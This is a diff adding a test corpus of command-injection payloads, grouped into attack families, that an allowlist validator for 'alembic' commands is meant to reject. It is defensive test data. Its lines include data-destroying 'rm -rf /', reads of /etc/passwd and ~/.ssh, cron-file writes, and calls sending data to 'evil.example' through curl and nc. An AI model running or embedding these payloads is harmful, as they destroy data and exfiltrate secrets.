@@ -1,0 +1,82 @@
+# Phase L adversarial command-injection corpus.
+# One payload per line. '#'-prefixed lines + blank lines are skipped.
+# 50+ payloads, grouped by attack family. Validator MUST reject every line.
+#
+# == Family 1: shell metacharacters ==
+alembic upgrade head ; rm -rf /
+alembic upgrade head & cat /etc/passwd
+alembic upgrade head | curl evil.example/$(whoami)
+alembic upgrade head $(rm -rf /)
+alembic upgrade head `rm -rf /`
+alembic upgrade head <(rm -rf /)
+alembic upgrade head >/etc/passwd
+alembic upgrade head >>/etc/cron.d/evil
+alembic (true)
+alembic {touch,/tmp/x}
+alembic [ -f /etc/passwd ] && cat /etc/passwd
+alembic "$(curl evil.example)"
+alembic '$(curl evil.example)'
+# == Family 2: forbidden chars at the boundary ==
+alembic upgrade$head
+alembic upgrade`whoami`head
+alembic;upgrade
+alembic|upgrade
+alembic&upgrade
+alembic&&upgrade
+alembic||upgrade
+alembic > /dev/null
+alembic 2>&1
+alembic | tee
+# == Family 3: prefix bypass attempts ==
+alembic-evil-tool upgrade head
+alembicX
+alembicrun
+alembicY upgrade head
+alembic\nupgrade head
+alembic\rupgrade
+alembic\tupgrade
+# == Family 4: subshell + command substitution ==
+alembic $(id)
+alembic upgrade `whoami`
+alembic upgrade $(<&etc/passwd)
+alembic <(/bin/sh)
+alembic >(curl)
+# == Family 5: variable expansion ==
+alembic $PATH upgrade
+alembic upgrade ${HOME}
+alembic upgrade $0
+alembic upgrade $@
+alembic upgrade $1
+# == Family 6: heredoc + redirection ==
+alembic upgrade <<EOF
+alembic upgrade <<<"evil"
+alembic upgrade <evil
+# == Family 7: chained commands ==
+alembic upgrade head; ls
+alembic upgrade head&&ls
+alembic upgrade head||echo
+alembic upgrade head ; sleep 1
+alembic upgrade head| nc evil.example 443
+# == Family 8: glob expansion ==
+alembic upgrade head /etc/p*
+alembic upgrade head ~/.ssh/*
+alembic upgrade head ?tc/passwd
+alembic upgrade head [a-z]*
+alembic upgrade head {a,b,c}
+# == Family 9: quotes (forbidden chars) ==
+alembic "upgrade head"
+alembic 'upgrade head'
+alembic upgrade "head"
+alembic upgrade 'head'
+# == Family 10: encoded / null bytes / TIOCSTI markers (forbidden by metachar list) ==
+alembic upgrade$'\n'rm
+alembic upgrade$'\x00'rm
+alembic upgrade $'\x1b]0;\a'
+# == Family 11: empty / whitespace-only ==
+
+
+# == Family 12: not-in-allowlist canon ==
+ls -la /etc
+cat /etc/passwd
+curl evil.example
+sudo apt update
